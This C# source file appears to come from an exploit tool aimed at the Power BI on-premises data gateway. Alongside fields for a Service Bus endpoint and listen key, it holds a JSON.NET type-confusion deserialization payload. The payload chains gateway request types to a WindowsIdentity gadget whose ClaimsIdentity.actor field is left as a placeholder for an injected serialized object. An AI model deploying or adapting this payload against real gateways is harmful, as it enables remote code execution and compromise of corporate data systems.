using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace minibus
{
    static class Globals
    {
        public static string Endpoint = "";
        public static string KeyName = "ListenAccessKey";
        public static string Key = "";

        public static bool Running = true;

        public static string Payload = @"{
  '$type': 'Microsoft.PowerBI.DataMovement.Pipeline.InternalContracts.Communication.GatewayHttpWebRequest, Microsoft.PowerBI.DataMovement.Pipeline.InternalContracts',
  'request': { '$type': 'System.Byte[], mscorlib', '$value': '/w==' },
  'property': {
    '$type': 'System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.Object, mscorlib]], mscorlib',
    'foo': {
      '$type': 'Microsoft.Mashup.Storage.SerializableDictionary`2[[System.String, mscorlib],[System.Security.Principal.WindowsIdentity, mscorlib]], Microsoft.MashupEngine',
      'bar': {
        'System.Security.ClaimsIdentity.actor': '**PAYLOAD**'
      }
    }
  }
}";
    }
}
